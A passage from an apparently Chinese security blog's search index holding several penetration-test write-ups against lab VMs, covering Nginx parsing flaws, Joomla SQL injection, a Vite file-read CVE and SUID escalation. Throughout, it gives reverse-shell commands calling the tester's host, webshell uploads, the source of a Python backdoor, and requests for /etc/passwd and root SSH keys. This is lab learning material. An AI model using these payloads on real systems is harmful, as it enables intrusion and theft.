DOCUMENT_ROOT：设置文档根目录为/var/www/html这段配置的作用是将所有.php请求通过FastCGI协议转发给PHP处理器(PHP-FPM)，并正确设置文件路径参数，使PHP能够找到并执行对应的脚本文件。当我们构造一个phpinfo.gif[0x20][0x00].php的请求时，这个URI可以匹配上正则\\.php$，可以进入这个location块；但进入后，Nginx却错误地认为请求的文件是phpinfo.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给FastCGI。fastcgi根据SCRIPT_FILENAME的值进行解析，将文件/var/www/html/phpinfo.gif按照PHP文件执行，最后造成了解析漏洞。 开启CVE-2013-4547漏洞环境 先试一下上传功能，允许传图片，禁止传php文件。 先上传一个图片文件，上传时使用burpsuit抓取并修改图片文件内容为php代码。 在浏览器里面访问http://192.168.196.128:8080/uploadfiles/2.jpg...php，使用burpsuit抓取一个数据包给重放器。修改URI中三个点中的前两个为20和00，点击发送。注意这里不能在浏览器里面直接访问，直接空格不会有效果，在bp操作即可 既然phpinfo()能成功，可以试一下system()函数。 上传成功，访问：http://192.168.196.128:8080/uploadfiles/2.jpg...php 注意那三个点。burpsuit拦截，发送到重放器修改。 生成一句话木马： 提示上传成功 访问：http://192.168.196.128:8080/uploadfiles/2.jpg...php 注意那三个点。burpsuit拦截，发送到重放器修改。 在http://192.168.196.128:8080/uploadfiles/路径下将生成shell.php文件，内容为后门php执行代码 可以用蚁剑了，连接地址：http://192.168.196.128:8080/uploadfiles/shell.php，密码e。 反弹shell在原有抓包的基础上修改内容即可 停止并删除容器1docker-compose down -v 漏洞修复12security.limit_extensions设置了就只能解析指定后缀的文件，为空可以解析所有后缀文件。将 php-fpm.conf 中的 security.limit_extensions 设置为.php。测试漏洞是否还存在。","categories":[{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"}],"tags":[{"name":"空格","slug":"空格","permalink":"http://example.com/tags/%E7%A9%BA%E6%A0%BC/"},{"name":"3个点","slug":"3个点","permalink":"http://example.com/tags/3%E4%B8%AA%E7%82%B9/"}]},{"title":"Nginx解析漏洞","slug":"Nginx解析漏洞","date":"2025-09-13T14:37:00.952Z","updated":"2025-09-15T08:12:26.759Z","comments":true,"path":"2025/09/13/Nginx解析漏洞/","permalink":"http://example.com/2025/09/13/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Nginx 解析漏洞(nginx_parsing_vulnerability)位置nginx&#x2F;nginx_parsing_vulnerability&#x2F; Nginx 解析漏洞（nginx_parsing_vulnerability）是由于 Nginx 配置不当导致的安全漏洞，与 Nginx 和 PHP 版本无关。以下是具体介绍： 漏洞原理Nginx 通常会把.php 结尾的文件交给 FastCGI 处理。而 PHP 配置文件 php.ini 中的 cgi.fix_pathinfo 选项默认值为 1，即开启状态。当遇到文件路径如 &#x2F;test.png&#x2F;x.php 时，若 x.php 不存在，PHP 会去掉最后的 &#x2F;x.php，然后判断 &#x2F;test.png 是否存在，若存在，则把 &#x2F;test.png 当做 &#x2F;test.png&#x2F;x.php 解析。同时，php-fpm.conf 中的 security.limit_extensions 配置项用于限制 FastCGI 解析文件的类型，若该选项未开启（或设置为空），FastCGI 就可将非.php 后缀的文件当作 PHP 文件解析，从而导致解析漏洞。 影响版本Nginx 0.8.41 - 1.4.3、1.5.0 - 1.5.7 等版本存在此问题，但主要是因配置不当引发，其他版本若配置有误也可能出现。 漏洞危害：攻击者可利用该漏洞绕过文件上传检测，将包含恶意代码的文件（如图片木马）上传至服务器，然后通过构造特定 URL，使服务器将这些文件当作 PHP 文件执行，进而可能窃取机密数据、篡改网页、控制服务器或入侵局域网等。 防御方法：使用规范化、模板化且经过安全测试的配置文件，在系统上线前对 Nginx 的 default.conf 以及 PHP 的 php.ini 等敏感配置文件进行检查。将 php.ini 文件中的 cgi.fix_pathinfo 的值设置为 0，关闭 cgi 解析；同时将 php-fpm.conf 中的 security.limit_extensions 设置为.php，仅支持.php 后缀解析。 开启漏洞环境123cd ~/vulhub/vulhub-master/nginx/nginx_parsing_vulnerabilitydocker-compose up -ddocker-compose ps 测试是否开启成功1curl http://192.168.196.128 随便尝试上传非图片格式的文件，将会收到“Please ensure you are uploading an image.”的回显，提示要上传图片格式。 GIF绕过从而执行php代码GIF89a+php后门代码 使用burpsuit截获上传文件并修改内容 在PHP文件开头添加GIF89a（GIF文件的标准文件头），会让服务器误以为这是一个合法的GIF图片，从而绕过文件类型检查。在php文件（如PHP木马）开头添加GIF89a的原因是为了绕过安全检测和欺骗文件类型验证，这是一种常见的混淆技术。 放行修改后的数据包，提示上传成功。 1“File uploaded successfully: /var/www/html/uploadfiles/cbc720f5451f60a8507e2548f620234f.png” //但是浏览器访问上传后的路径，无法解析成为php 也可以上传一个图片马 图片+php后门代码-&gt;生成一个新的带有php后门代码的图片文件 1copy normal.jpg/b + 1.php/a a.jpg 在路径后添加 &#x2F;x.php，成功按照PHP解析(这里的x可以是任意命名只要是.php后缀即可) 上传木马文件按照上述步骤上传木马文件，使用蚁剑进行测试，可成功连接木马。 注意在用蚁剑连接后门的时候url地址后面要添加x.php，这样上传的木马文件才能被解析 停止并删除容器1docker-compose down -v 漏洞修复123将 php.ini 文件中的 cgi.fix_pathinfo 的值设置为 0，关闭 cgi 解析。将 php-fpm.conf 中的 security.limit_extensions 设置为.php。 测试漏洞是否还存在。","categories":[{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"}],"tags":[{"name":"Nginx解析漏洞","slug":"Nginx解析漏洞","permalink":"http://example.com/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"蚁剑","slug":"蚁剑","permalink":"http://example.com/tags/%E8%9A%81%E5%89%91/"},{"name":"GIF绕过","slug":"GIF绕过","permalink":"http://example.com/tags/GIF%E7%BB%95%E8%BF%87/"}]},{"title":"DC-3","slug":"DC-3","date":"2025-09-10T00:40:47.501Z","updated":"2025-11-01T07:45:02.024Z","comments":true,"path":"2025/09/10/DC-3/","permalink":"http://example.com/2025/09/10/DC-3/","excerpt":"","text":"一、信息收集JoomScan 的作用是一个自动化的 Joomla 专属安全扫描器，用于快速发现和报告 Joomla 网站中的常见配置错误、信息泄露和已知安全漏洞，是保护 Joomla 网站安全的第一道高效自动化防线。 1joomscan -u http://192.168.88.27 发现Joomla的版本是 3.7.0，admin的登录页面是http://192.168.88.27/administrator/ searchsploit 的作用是一个离线的、命令行的漏洞利用数据库搜索引擎。它是渗透测试人员、安全研究员和系统管理员用于快速查找、验证和研究公开漏洞利用代码的必备神器，极大地提高了安全评估和研究的效率 1searchsploit Joomla 3.7.0 //搜索Joomla的漏洞 二、web漏洞查找存在sql注入1searchsploit -p 42033 //查看漏洞的详情 搜索到漏洞的路径查看一下 1cat /usr/share/exploitdb/exploits/php/webapps/42033.txt 1sqlmap -u &quot;http://192.168.88.27/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] //查看所有数据库名 “sqlmap，请你攻击 192.168.88.27 这台主机上的 Joomla 网站。我已经为你指明了最可能的攻击入口（list[fullordering] 参数），并为你铺好了路（设置了 updatexml 的值）。请你用最高级别的测试深度和风险（level=5, risk=3），并且伪装你的浏览器指纹（--random-agent），绕过简单的防御。你的最终任务是，在成功利用漏洞后，把对方数据库里所有的数据库名都给我列出来（--dbs）。” 1sqlmap -u &quot;http://192.168.88.27/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables //查看joomladb数据库的所有表名 1sqlmap -u &quot;http://192.168.88.27/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns //查看joomladb数据库的#__users表的所有列名 1sqlmap -u &quot;http://192.168.88.27/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C password,username --dump //dump下joomladb数据库的#__users表的password,username 把加密的密码单独放到一个txt文件里面，用john来解密一下 12345john 1.txtjohn --show 1.txtadminsnoopy 第一个登录页面显示只有一个flag然后只能获得root权限之后才能得到flag，只有一个入口点没有线索 再去admin的登录界面，发现可以提交文件的路口 上传木马文件查找木马文件在靶机的路径 1dirsearch -u http://192.168.88.27 1http://192.168.88.27/administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=LzEucGhw 1http://192.168.88.27/templates/beez3/1.php //木马文件路径 反弹shell法一： 1msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f raw &gt; shell.php //随机生成一个php后门连接代码 123456789101112kali：msfconsoleuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsset lhost 192.168.88.10set lport 1234show optionsrunshellpython -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; //获得交互shell 法二: 123上传1.php给靶机，然后kali监听之后，浏览器再次刷新，就可以获得反弹shell了&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.10/1234 0&gt;&amp;1&#x27;&quot;);?&gt; 三、提取www-data-&gt;root漏洞攻击脚本法一：CVE-2021-40341https://github.com/berdav/CVE-2021-4034 //CVE-2021-4034-main.zip 下载脚本之后直接拖到kali里面，然后kali开启http服务，靶机在&#x2F;tmp目录wget kali里面的脚本压缩包然后就是直接unzip解压缩，进入脚本文件之后make一下(make 命令的作用是自动化编译和准备漏洞利用所需的所有组件。)，最后直接执行.&#x2F;cve-2021-4034，最终得到root shell","categories":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://example.com/categories/Vulnhub/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"http://example.com/tags/sqlmap/"},{"name":"JoomScan","slug":"JoomScan","permalink":"http://example.com/tags/JoomScan/"},{"name":"msfvenom","slug":"msfvenom","permalink":"http://example.com/tags/msfvenom/"}]},{"title":"群友靶机--Method","slug":"群友靶机--Method","date":"2025-09-04T09:18:03.982Z","updated":"2025-09-15T03:06:37.469Z","comments":true,"path":"2025/09/04/群友靶机--Method/","permalink":"http://example.com/2025/09/04/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--Method/","excerpt":"","text":"一、信息收集1.靶机IP确定192.168.88.21 2.端口发现常规22，80端口 3.web信息获取basic认证爆破 登录入口basic认证爆破，拿到用户密码admin:princess101 nikto登陆后无可用信息，用nikto跑一遍。 1nikto -h http://靶机IP -id admin:princess101 根据Nikto扫描结果，发现靶机允许PUT方法，上传个shell.php，反弹即可。 put方法这是一个高危信号！PUT方法允许客户端向服务器上传文件。如果服务器配置不当，开启了PUT方法，你就可以直接上传一个Web Shell。bp抓包提交。 shell2.php上传成功之后直接访问可知可以执行系统命令了就可以反弹一个shell回来 123bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.10/4444 0&gt;&amp;1&#x27;http://192.168.88.21/shell2.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.88.10/1234+0%3E%261%27 //URL 编码的反向 Shell (Reverse Shell) 载荷 二、提权www-data-&gt;bamuwe1.信息获取cat &#x2F;etc&#x2F;passwd中发现‘bamuwe’用户，在&#x2F;opt下发现两个相关文件 12-rwxr-xr-x 1 bamuwe bamuwe 16936 Jul 31 07:41 bamuwe-rwxr-xr-x 1 root root 4729 Jul 31 07:21 pyrat.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180pyrat.py源码--这是一个非常有趣的Python后门/RAT（远程管理工具）#!/usr/bin/python3# Made by josemlwdf@github.com# Pyrat.py is a &quot;python RAT tool&quot; designed to be used on CTFimport socketimport sysfrom io import StringIOimport datetimeimport osimport multiprocessingdef handle_client(client_socket, client_address, admins): try: while True: # Receive data from the client data = client_socket.recv(1024).decode(&quot;utf-8&quot;) if not data: break # Client disconnected if is_http(data): send_data(client_socket, fake_http()) continue switch_case(client_socket, str(data).strip(), admins) except: pass remove_socket(client_socket, admins)def switch_case(client_socket, data, admins): if data == &#x27;jose&#x27;: get_admin(client_socket, admins) else: uid = os.getuid() if (uid == 0) and (str(client_socket) not in admins): change_uid() if data == &#x27;shell&#x27;: shell(client_socket) remove_socket(client_socket, admins) else: exec_python(client_socket, data)def exec_python(client_socket, data): try: print(str(client_socket) + &quot; : &quot; + str(data)) captured_output = StringIO() sys.stdout = captured_output exec(data) exec_output = captured_output.getvalue() send_data(client_socket, exec_output) except Exception as e: send_data(client_socket, str(e)) finally: sys.stdout = sys.__stdout__ def get_admin(client_socket, admins): uid = os.getuid() if uid != 0: send_data(client_socket, &quot;Start a fresh client to begin.&quot;) return password = &#x27;this_is_pass&#x27; for _ in range(3): # Three password attempts send_data(client_socket, &quot;Password:&quot;) try: data = client_socket.recv(1024).decode(&quot;utf-8&quot;) except Exception as e: # Send the exception message back to the client send_data(client_socket, str(e)) return if data.strip() == password: admins.append(str(client_socket)) send_data(client_socket, &#x27;Welcome Admin!!! Type &quot;shell&quot; to begin&#x27;) breakdef shell(client_socket): try: import pty os.dup2(client_socket.fileno(), 0) os.dup2(client_socket.fileno(), 1) os.dup2(client_socket.fileno(), 2) pty.spawn(&quot;/bin/sh&quot;) except Exception as e: send_data(client_socket, str(e))# Sends data to the clientsdef send_data(client_socket, data): try: client_socket.sendall((str(data) + &#x27;\\n&#x27;).encode(&quot;utf-8&quot;)) except: passdef start_server(host, port, admins): server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socket.bind((host, port)) server_socket.listen(5) while True: client_socket, client_address = server_socket.accept() # Start a new process to handle the client p = multiprocessing.Process(target=handle_client, args=(client_socket, client_address, admins)) p.start()def remove_socket(client_socket, admins): client_socket.close() try: admins = admins._getvalue() # Get the actual list if str(client_socket) in admins: admins.remove(str(client_socket)) except: pass# Check if the received data is an HTTP requestdef is_http(data): return &#x27;HTTP&#x27; in data and &#x27;Host:&#x27; in data# Sends a fake Python HTTP Server Bannerdef fake_http(): try: # Get the current date and time and format the date and time according to the desired format formatted_datetime = datetime.datetime.now().strftime(&quot;%a %b %d %H:%M:%S %Z %Y&quot;) banner = f&quot;&quot;&quot;HTTP/1.0 200 OKServer: SimpleHTTP/0.6 Python/3.11.2Date: &#123;formatted_datetime&#125;Content-type: text/html; charset=utf-8Content-Length: 27Try a more basic connection!&quot;&quot;&quot; return banner[1:] # Remove leading newline except: return &#x27;HTTP/1.0 200 OK&#x27;def change_uid(): uid = os.getuid() if uid == 0: # Make Python code execution run as user 33 (www-data) euid = 33 groups = os.getgroups() if 0 in groups: groups.remove(0) os.setgroups(groups) os.setgid(euid) os.setuid(euid)# MAINif __name__ == &quot;__main__&quot;: multiprocessing.freeze_support() # Needed for Windows, harmless on macOS/Linux manager = multiprocessing.Manager() admins = manager.list() # Shared list for tracking admins host = &quot;127.0.0.1&quot; port = 8000 try: start_server(host, port, admins) except KeyboardInterrupt: print(&#x27;Shutting Down...&#x27;) sys.exit(1) 这个脚本是一个伪装成Python HTTP服务器的后门。它监听端口8000，如果收到HTTP请求，就返回一个假的HTTP响应来伪装自己。如果收到非HTTP的特定指令，它会执行Python代码或提供一个完整的Shell。 服务绑定在 127.0.0.1:8000 12345678步骤：1. 使用 `netcat` 或 `socat` 连接本地服务： `nc 127.0.0.1 8000`2. 发送魔法口令 `jose`。3. 服务会回复 `Password:`，发送硬编码密码 `this_is_pass`。4. 认证成功后，服务回复 `Welcome Admin!!! Type &quot;shell&quot; to begin`。5. 发送命令 `shell`。6. 你现在获得了一个完全的、以root权限运行的交互式Shell。 分析pyrat.py源码，得知需要root用户启动后，jose进入管理员认证模式-&gt;输入密码‘this_is_pass’-&gt;shell，即可拿到root。因此猜测需要先攻破bamuwe文件。 2.bamuwe文件分析 bamuwe执行后也是输入密码，简单爆破了下无果，拿出来用IDA分析下 12python3 -m http.server //默认8000wget 192.168.88.21:8000/bamuwe F5查看伪C代码 main: decrypt: 加密数据由三部分组成：v8&#x2F;v9&#x2F;v10， 转换为小端序：54 50 02 03 15 03 16 12 4F F4 B1 04 14 03， 随后异或解出密码:26deseptiembre 1234567891011121314151617181920# 提取 v8 的字节（小端序）v8 = 0x1216031503025054v8_bytes = []for i in range(8): v8_bytes.append((v8 &gt;&gt; (i * 8)) &amp; 0xFF)# 提取 v9 的字节（小端序）v9 = 67830543v9_bytes = []for i in range(4): v9_bytes.append((v9 &gt;&gt; (i * 8)) &amp; 0xFF)# 提取 v10 的字节（小端序）v10 = 788v10_bytes = []for i in range(2): v10_bytes.append((v10 &gt;&gt; (i * 8)) &amp; 0xFF)encrypted_bytes = v8_bytes + v9_bytes + v10_bytesdecrypted_bytes = [b ^ 0x66 for b in encrypted_bytes]password = &#x27;&#x27;.join(chr(b) for b in decrypted_bytes)print(password) bamuwe-&gt;rootSSH登录bamuwe用户，密码：26deseptiembre sudo -l发现正好可以root无密码执行&#x2F;opt&#x2F;pyrat.py，跟前面分析闭环了。 注意先把所有运行的python服务关闭杀掉 然后无密码运行pyrat.py1sudo /opt/pyrat.py 再开一个窗口连接 1bamuwe@Method:/opt$ busybox nc 127.0.0.1 8000 jose进入管理员认证模式-&gt;输入密码‘this_is_pass’-&gt;shell 12345678步骤：1. 使用 `netcat` 或 `socat` 连接本地服务： `nc 127.0.0.1 8000`2. 发送魔法口令 `jose`。3. 服务会回复 `Password:`，发送硬编码密码 `this_is_pass`。4. 认证成功后，服务回复 `Welcome Admin!!! Type &quot;shell&quot; to begin`。5. 发送命令 `shell`。6. 你现在获得了一个完全的、以root权限运行的交互式Shell。 至此渗透测试结束","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"basic认证爆破","slug":"basic认证爆破","permalink":"http://example.com/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/"},{"name":"nikto","slug":"nikto","permalink":"http://example.com/tags/nikto/"},{"name":"put方法","slug":"put方法","permalink":"http://example.com/tags/put%E6%96%B9%E6%B3%95/"}]},{"title":"自制靶机--Rabbit","slug":"自制靶机--Rabbit","date":"2025-08-31T01:28:29.915Z","updated":"2025-09-15T03:07:37.719Z","comments":true,"path":"2025/08/31/自制靶机--Rabbit/","permalink":"http://example.com/2025/08/31/%E8%87%AA%E5%88%B6%E9%9D%B6%E6%9C%BA--Rabbit/","excerpt":"","text":"一、信息收集1.主机发现123456┌──(root㉿kali)-[~]└─# arp-scan -l.......Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan).......192.168.55.25 08:00:27:e1:7b:f0 PCS Systemtechnik GmbH 扫描结果表明，目标主机IP为 192.168.55.25。 2.端口扫描123456789101112131415161718┌──(root㉿kali)-[~]└─# nmap 192.168.55.25 -p- -A Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 21:39 EDTNmap scan report for 192.168.55.25Host is up (0.0019s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 10.0p2 Debian 7 (protocol 2.0)80/tcp open http Apache httpd 2.4.65 ((Debian))|_http-server-header: Apache/2.4.65 (Debian)|_http-title: \\xE6\\xAC\\xA2\\xE8\\xBF\\x8E\\xE6\\x9D\\xA5\\xE5\\x88\\xB0X8@0E\\xE7\\x9A\\x84\\xE4\\xB9\\x90\\xE5\\x9B\\xADMAC Address: 08:00:27:E1:7B:F0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Device type: general purpose|routerRunning: Linux 4.X|5.X, MikroTik RouterOS 7.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 开放了 **22 (SSH)和80 (HTTP)**端口。访问80端口，一个静态页面。 二、漏洞发现与初始访问1.Web参数与RCE根据提示找一下，查看80页面的源码，找到**&#x2F;vuxe-xe目录和?xe** 根据找到的**&#x2F;vuxe-xe**用gobuster扫一下目录，发现了一个index.php是个空白页面 123456789101112┌──(root㉿kali)-[~]└─# gobuster dir -u http://192.168.88.25/vuxe-xe -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x.php,.html,.txt,.xml.......===============================================================Starting gobuster in directory enumeration mode===============================================================/.php (Status: 403) [Size: 278]/.html (Status: 403) [Size: 278]/index.php (Status: 200) [Size: 0]/.php (Status: 403) [Size: 278]/.html (Status: 403) [Size: 278]........ 再根据**?xe**参数发现存在远程代码执行（RCE）漏洞。 123┌──(root㉿kali)-[~]└─# curl http://192.168.55.25/vuxe-xe/index.php?xe=iduid=33(www-data) gid=33(www-data) groups=33(www-data) 其实这里也可以不用扫目录直接访问即可 123┌──(root㉿kali)-[~]└─# curl http://192.168.55.25/vuxe-xe/?xe=id uid=33(www-data) gid=33(www-data) groups=33(www-data) 2.获取 www-data Shell本地监听 123┌──(root㉿kali)-[~]└─# nc -lvnp 1234 listening on [any] 1234 ... 执行Payload: 1curl http://192.168.55.25/vuxe-xe/index.php?xe=busybox+nc+192.168.55.10+1234+-e+/bin/bash 稳定shell 1234567script /dev/null -c bashCtrl+Zstty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=/bin/bashstty rows 24 columns 80 三、权限提升第一条路www-data -&gt;alliy-&gt;root 1.www-data -&gt;alliy在 www-data shell中，查看 &#x2F;home 目录发现存在用户alliy ，还有一个README.txt，cat一下。 123456www-data@Rabbit:/home$ ls -altotal 16drwxr-xr-x 3 root root 4096 Aug 30 16:31 .drwxr-xr-x 18 root root 4096 Aug 30 16:01 ..-rw-rw-r-- 1 www-data www-data 85 Aug 30 16:31 README.txtdrwx------ 2 alliy alliy 4096 Aug 30 16:49 alliy 123456www-data@Rabbit:/home$ cat README.txtCome and help the little rabbit!ijmkaK4AAazW2huii0e5ePz6e3pBhTsjHVRdZhZqHBM=opt? 发现是以rabbit加密的base64编码，根据提示opt?，去opt目录看一下，有一个cipher.txt，cat一下。 123456www-data@Rabbit:/opt$ ls -altotal 16drwxr-xr-x 3 root root 4096 Aug 30 16:35 .drwxr-xr-x 18 root root 4096 Aug 30 16:01 ..-rw-rw-r-- 1 www-data www-data 46 Aug 30 16:31 cipher.txtdrwxrwxr-x 2 root root 4096 Aug 30 16:35 xe 123www-data@Rabbit:/opt$ cat cipher.txtPadding: fourthKey: MDAwMDAwMDM3MjYxOTAzOA== 根据Padding: fourth，没有明确指出padding，去找一下Rabbit解码网站： 1https://www.toolhelper.cn/SymmetricEncryption/Rabbit 同时**Key: MDAwMDAwMDM3MjYxOTAzOA&#x3D;&#x3D;**也是经过base64编码的，解码之后是0000000372619038 rabbit解密之后拿到一个密码：Str0ng!xe_P@ss829，再根据上面找到的alliy用户，登录到alliy用户。 1234www-data@Rabbit:/opt$ su alliyPassword: Str0ng!xe_P@ss829alliy@Rabbit:/opt$ iduid=1000(alliy) gid=1000(alliy) groups=1000(alliy) 2.alliy-&gt;root通过find到了一个suid文件&#x2F;usr&#x2F;local&#x2F;bin&#x2F;system_xe 123alliy@Rabbit:/opt$ find / -perm -u=s -type f 2&gt;/dev/null........./usr/local/bin/system_xe 查看&#x2F;usr&#x2F;local&#x2F;bin&#x2F;system_xe发现是要设置环境变量和进入相应的路径**&#x2F;opt&#x2F;xe**再执行程序 123456789101112131415161718192021222324252627282930c源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; char *secret = getenv(&quot;SUID_SECRET&quot;); if (secret == NULL || strcmp(secret, &quot;Xj3#9&quot;) != 0) &#123; printf(&quot;Usage: Set SUID_SECRET environment variable\\n&quot;); return 1; &#125; char cwd[256]; if (getcwd(cwd, sizeof(cwd)) != NULL) &#123; if (strstr(cwd, &quot;/opt/xe&quot;) == NULL) &#123; return 1; &#125; &#125; setuid(0); char *args[] = &#123;&quot;/bin/bash&quot;, &quot;-p&quot;, NULL&#125;; execve(&quot;/bin/bash&quot;, args, NULL); return 0;&#125; 设置环境变量-&gt;切换目录-&gt;执行-&gt;get root shell 12345alliy@Rabbit:/opt$ export SUID_SECRET=&quot;Xj3#9&quot;alliy@Rabbit:/opt$ cd xealliy@Rabbit:/opt/xe$ /usr/local/bin/system_xeroot@Rabbit:/opt/xe# id uid=0(root) gid=1000(alliy) groups=1000(alliy) 第二条路www-data-&gt;root直接就是在www-data用户下找到suid文件&#x2F;usr&#x2F;local&#x2F;bin&#x2F;system_xe，设置环境变量，切换目录执行，get root shell 12345www-data@Rabbit:/opt$ export SUID_SECRET=&quot;Xj3#9&quot;www-data@Rabbit:/opt$ cd xewww-data@Rabbit:/opt/xe$ /usr/local/bin/system_xeroot@Rabbit:/opt/xe# iduid=0(root) gid=33(www-data) groups=33(www-data) 读取flag 123root@Rabbit:/opt/xe# cat /root/root.txt /home/alliy/user.txtflag&#123;root-GGGgratulat1ons_0n_Th3_X_E!&#125;flag&#123;user-C0ngratulat1ons_0n_Th3_X_E!&#125; 至此渗透测试结束","categories":[{"name":"自制靶机","slug":"自制靶机","permalink":"http://example.com/categories/%E8%87%AA%E5%88%B6%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"Rabbit","slug":"Rabbit","permalink":"http://example.com/tags/Rabbit/"}]},{"title":"群友靶机--Pane12","slug":"群友靶机--Pane12","date":"2025-08-29T01:50:34.463Z","updated":"2025-08-29T02:59:14.826Z","comments":true,"path":"2025/08/29/群友靶机--Pane12/","permalink":"http://example.com/2025/08/29/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--Pane12/","excerpt":"","text":"一、信息收集1.扫描IParp-scan -l扫描出靶机IP为192.168.88.18 2.扫描端口22&#x2F;ssh，80&#x2F;http，3000&#x2F;ppp?，888&#x2F;http，3306&#x2F;mysql，8080&#x2F;http，12109&#x2F;panel 80啥也没有 8080是Vite 管理面板 12109是个宝塔面板但无法访问 8080端口启动vite后，刷新状态出现了新的网站3000 3.3000端口扫描目录 其中&#x2F;package.json路由泄露了依赖版本 二、权限提升1.任意文件读取漏洞vite6.2.0存在任意文件读取漏洞(CVE-2025-30208)123456789101112131415161718CVE-2025-30208 是 Vite 开发服务器中的一个 任意文件读取漏洞。该漏洞允许攻击者通过特定的 URL 参数绕过访问控制，从而读取服务器上的敏感文件（如 /etc/passwd 或 C:\\\\windows\\\\win.ini）。漏洞原理Vite 开发服务器提供 @fs 机制，用于防止访问 Vite 允许列表之外的文件。然而，由于 URL 解析时的正则表达式处理不当，攻击者可以通过 ?raw?? 或 ?import&amp;raw?? 等查询参数绕过访问限制，从而读取任意文件。影响范围此漏洞主要影响以下版本的 Vite：6.2.3 之前6.1.2 之前6.0.12 之前5.4.15 之前4.5.10 之前漏洞利用攻击者可以通过构造类似如下的请求绕过安全检查：GET /@fs/etc/passwd?raw??GET /@fs/etc/passwd?import&amp;raw??由于 Vite 解析 URL 时未正确处理这些参数，导致绕过 server.fs.allow 限制，并返回任意文件内容。 法一：直接打payload 1http://192.168.88.18:3000/@fs/etc/passwd?import&amp;raw?? //读取/etc/passwd 存在Eecho，welcome用户 2.welcomehydra爆破一下，存在弱口令 welcome&#x2F;welcome 直接ssh连 可以无密码执行&#x2F;usr&#x2F;bin&#x2F;bt 3.welcome-&gt;root这个是宝塔面板的命令行管理工具，通过14查看宝塔默认信息 123username: jgda25snpassword: 通过 bt 5 命令修改密码内网面板地址: https://192.168.88.18:12109/2bcce14f 获取到了安全入口，但不知道密码，可以直接改密码的 1sudo /usr/bin/bt 5 登录宝塔面板 一开始进来的时候终端的功能被隐藏了所以要去打开然后就能使用终端功能提权 法二：直接读取root下的私钥(已经被他们修复了所以我这里演示不了，就用没修复之前的人写的wp演示) 1http://172.20.10.3:3000/@fs/root/.ssh/authorized_keys?raw?? 读取一下密钥： 1http://172.20.10.3:3000/@fs/root/.ssh/id_ed25519?raw?? 123-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACC1xs----END OPENSSH PRIVATE KEY-----\\n","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"vite","slug":"vite","permalink":"http://example.com/tags/vite/"},{"name":"任意文件读取漏洞(CVE-2025-30208)","slug":"任意文件读取漏洞-CVE-2025-30208","permalink":"http://example.com/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/"}]},{"title":"群友靶机--Cat","slug":"群友靶机--Cat","date":"2025-08-28T09:34:20.877Z","updated":"2025-08-28T12:54:01.685Z","comments":true,"path":"2025/08/28/群友靶机--Cat/","permalink":"http://example.com/2025/08/28/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--Cat/","excerpt":"","text":"一、信息收集1.主机发现使用 arp-scan 